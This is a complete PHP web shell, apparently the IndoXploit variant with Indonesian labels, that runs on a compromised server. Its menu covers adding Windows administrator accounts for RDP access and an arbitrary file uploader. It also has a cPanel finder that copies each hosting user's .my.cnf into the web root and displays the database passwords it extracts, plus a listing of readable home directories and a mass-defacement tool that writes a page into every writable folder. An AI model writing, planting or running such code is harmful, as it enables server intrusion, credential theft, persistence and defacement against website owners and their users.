<?php

echo "
<html>
<body bgcolor=black>
<head>
<style type=text/css>
body{
	background:#000000;;
}
a {
text-decoration:none;
}
a:hover{
border-bottom:1px solid aqua;
}
*{
	font-size:11px;
	font-family:Courier,Courier,Courier;
	color:white;
}
#menu a{
	padding:4px 18px;
	margin:0;
	background:darkred;
	text-decoration:none;
	letter-spacing:2px;
	-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;

}
</style>

<title>69</title>
</head>
<br><center><div id=menu>
<a href=?cp>Cpanel finder</a>
<a href=?upl>Uploader</a>
</div></center>
<p>
<center>
<img src=http://vignette1.wikia.nocookie.net/fairytail/images/b/be/Chibi_uchiha_itachi.png width=272 height=315/><br /></center><br><center><div id=menu>
<a href=?jump>jumping</a>
<a href=?sabun>Sabun</a>
<a href=?rdp>RDP</a>
</div></center>
<br><br><center>".php_uname()."<br>";

if(isset($_GET["rdp"])){
if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			$user = htmlspecialchars($_POST['user']);
			$pass = htmlspecialchars($_POST['pass']);
			if(preg_match("/$user/", exe("net user"))) {
				echo "[INFO] -> <font color=red>user <font color=lime>$user</font> sudah ada</font>";
			} else {
				$add_user   = exe("net user $user $pass /add");
    			$add_groups1 = exe("net localgroup Administrators $user /add");
    			$add_groups2 = exe("net localgroup Administrator $user /add");
    			$add_groups3 = exe("net localgroup Administrateur $user /add");
    			echo "[ RDP ACCOUNT INFO ]<br>
    			------------------------------<br>
    			IP: <font color=lime>".$ip."</font><br>
    			Username: <font color=lime>$user</font><br>
    			Password: <font color=lime>$pass</font><br>
    			------------------------------<br><br>
    			[ STATUS ]<br>
    			------------------------------<br>
    			";
    			if($add_user) {
    				echo "[add user] -> <font color='lime'>Berhasil</font><br>";
    			} else {
    				echo "[add user] -> <font color='red'>Gagal</font><br>";
    			}
    			if($add_groups1) {
        			echo "[add localgroup Administrators] -> <font color='lime'>Berhasil</font><br>";
    			} elseif($add_groups2) {
        		    echo "[add localgroup Administrator] -> <font color='lime'>Berhasil</font><br>";
    			} elseif($add_groups3) { 
        		    echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil</font><br>";
    			} else {
    				echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
    			}
    			echo "------------------------------<br>";
			}
		} elseif($_POST['s_opsi']) {
			$user = htmlspecialchars($_POST['r_user']);
			if($_POST['opsi'] == '1') {
				$cek = exe("net user $user");
				echo "Checking username <font color=lime>$user</font> ....... ";
				if(preg_match("/$user/", $cek)) {
					echo "[ <font color=lime>Sudah ada</font> ]<br>
					------------------------------<br><br>
					<pre>$cek</pre>";
				} else {
					echo "[ <font color=red>belum ada</font> ]";
				}
			} elseif($_POST['opsi'] == '2') {
				$cek = exe("net user $user indoxploit");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>indoxploit</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
				}
			} elseif($_POST['opsi'] == '3') {
				$cek = exe("net user $user /DELETE");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[remove user: <font color=lime>$user</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
				}
			} else {
				//
			}
		} else {
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='indoxploit' required>
			<input type='text' name='pass' placeholder='password' value='indoxploit' required>
			<input type='submit' name='create' value='>>'>
			</form>
			-- Option --<br>
			<form method='post'>
			<input type='text' name='r_user' placeholder='username' required>
			<select name='opsi'>
			<option value='1'>Cek Username</option>
			<option value='2'>Ubah Password</option>
			<option value='3'>Hapus Username</option>
			</select>
			<input type='submit' name='s_opsi' value='>>'>
			</form>
			";
		}
	} else {
		echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
	}
}
############### MULAI DARI SINI #################
	elseif(isset($_GET["upl"]))
	{
	echo"<br><br><br><center><font color=red>";
		echo"<br><form method=post enctype=multipart/form-data>"; 
		echo"<input type=file name=f><input name=k type=submit id=k value=pencet><br>"; 
		  if($_POST["k"]==pencet)
	{ 
	if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){
	echo"<b>".$_FILES["f"]["name"];
	}else{
	echo"<b>Gagal upload";
	}
	}
	}


elseif(isset($_GET["cp"]))
	{
@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}

echo '<style>
textarea {
resize:none;
color: red ;
background-color:#ffffff;  
font-size:8pt; color:#000000;
border:1px solid white ;
border-left: 4px solid white ;
width:543px;
height:400px;
}
input {
color: #000000;
border:1px dotted white;
}
</style>';
echo '<center>';

$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");

if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {

echo "<table align=center><tr><th valign=top bgcolor=darkgreen class=style2> COUNT </th><th valign=top bgcolor=darkgreen > DOMAIN </th><th valign=top bgcolor=darkgreen class=style2 > USER </th><th valign=top bgcolor=darkgreen class=style2 > Password </th><th valign=top bgcolor=darkgreen class=style2 > .my.cnf </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();

if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td valign=top style=border :2px solid white; width: 139px class=style2>".$count++."</td><td valign=top style= width: 139px; border :2px solid white  class=style2 ><a href=http://".$domain.":2082 target=_blank>".$domain."</a></td><td valign=top style= width: 139px; border: 2px solid white  class=style2 >".$owner['name']."</td><td valign=top style= width: 139px; border: 2px solid white  class=style2 >".$password."</td><td valign=top style=border :2px solid white  id=menu style=width: 139px><a href=".$owner['name'].".txt target=_blank>Click Here</a></td></tr>";
    

$dc++;
}

}
}
echo '</table>'; 
$total = $dc;

echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align=center><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d);
    if(strpos($r[5],'home')) {
        $passwd[$r[0]] = $r[5];
    }
}
$l=0;
$j=1;
foreach($usr as $r) {
$dirz = '/home/'.$r.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$r.'.txt');
$p=file_get_contents(''.$path.'/'.$r.'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td valign=top bgcolor=darkgreen class=style2 style=width: 139px>".$count++."</td><td valign=top bgcolor=darkgreen class=style2 style=width: 139px><a target=_blank href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td valign=top bgcolor=darkgreen class=style2 style=width: 139px>'.$r."</td><td valign=top bgcolor=darkgreen class=style2 style=width: 139px>".$password."</td><td valign=top bgcolor=darkgreen class=style2 style=width: 139px><a href='".$r.".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
				}
            }
			}
echo '</table>'; 
$total = $dc;
echo '<br><div class=result valign=top bgcolor=darkgreen class=style2 style=width: 139px >Total cPanel Found = '.$total.'</h3><br />';
echo '</center>';

}
}else{
echo "<div class=result><i><font color=#FF0000>ERROR</font><br><font color=#FF0000>/var/named</font> or <font color=#FF0000>etc/named.conf</font> Not Accessible!</i></div>";
}
}


  ////////////////////////////////
   
   elseif(isset($_GET["jump"]))
	{
	 ($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<b>Error: safe_mode = on</b>');
	set_time_limit(0);
	###################
	@$passwd = fopen('/etc/passwd','r');
	if (!$passwd) { die('<b>[-] Error : coudn`t read /etc/passwd</b>'); }
	$pub = array();
	$users = array();
	$conf = array();
	$i = 0;
	while(!feof($passwd))
	{
		$str = fgets($passwd);
		if ($i > 35)
			{
			$pos = strpos($str,':');
			$username = substr($str,0,$pos);
			$dirz = '/home/'.$username.'/public_html/';
			if (($username != ''))
				{
				if (is_readable($dirz))
					{
					array_push($users,$username);
					array_push($pub,$dirz);
					}
				}
			}
		$i++;
	}
	
	###################
	echo '<br>';
	echo "[+] Founded <font size=15 color=red> ".sizeof($users)." </font> entrys in /etc/passwd\n"."<br />";
	echo "[+] Founded <font color=red size=15> ".sizeof($pub)." </font> readable public_html directories\n"."<br />";
	echo "[~] Searching for passwords in config files...\n\n"."<br /><br /><br />";
	foreach ($users as $user)
		{
		$path = "/home/$user/public_html/";
		echo "<table bgcolor=black class=style2 ><td>";
		echo "<font color=white>[Ok] $path</font><br>";
		echo "</td></table>";
		}
	echo "\n";
}



  ////////////////////////////////
   
 
	 elseif(isset($_GET["sabun"]))
	{
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Sabun:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by IndoXploit</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
	</form></center>";
	}
}
?>
